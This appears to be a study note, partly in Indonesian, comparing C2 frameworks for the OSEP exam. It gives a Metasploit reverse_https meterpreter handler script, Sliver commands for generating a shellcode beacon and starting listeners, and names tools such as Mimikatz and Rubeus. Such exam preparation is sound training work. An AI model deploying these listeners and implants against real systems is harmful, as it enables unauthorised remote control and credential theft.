---
name: "C2 Framework Strategy — Metasploit, Sliver & Mythic"
description: "C2 framework comparison and setup guides for OSEP exam: Metasploit (recommended), Sliver (Bishop Fox), and Mythic (SpecterOps) with automation scripts and StageListener bridge."
tags: [c2-framework, metasploit, sliver, mythic, command-control, stagelistener]
---

# C2 Framework Strategy

## Metasploit (Recommended for Exam)

Semua modul dan lab PEN-300 menggunakan Metasploit.

**Resource Script (auto.rc):**
```
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_https
set lhost tun0
set lport 443
set EnableStageEncoding true
set exitonsession false
set AutoRunScript post/windows/manage/migrate
run -j -z
```

## Sliver (Bishop Fox)

**Setup:**
```bash
sliver > profiles new beacon --mtls $IP:443 --format shellcode osep-beacon
sliver > stage-listener -u tcp://$IP:8080 -p osep-beacon
sliver > mtls -L $IP -l 443
```

**Armory Extensions:** SharpHound, Mimikatz, Rubeus, Seatbelt, PowerView, SharpUp

## Mythic (SpecterOps)

- GraphQL API untuk automasi payload generation
- Multi-agent (Apollo for Windows, Poseidon for Linux)
- Proxy functionality untuk pivoting

## StageListener Bridge

```
Legacy meterpreter stager → StageListener → Mythic Apollo agent
```

StageListener menggabungkan kemudahan meterpreter dengan modern C2 capabilities.

## Best Practices

- Kuasai SATU C2 framework (Metasploit disarankan untuk exam)
- Siapkan automation scripts untuk regenerate payloads
- Pastikan C2 listener active dan callbacks verified sebelum exam
- Sliver/Mythic bisa dipelajari setelah lulus OSEP
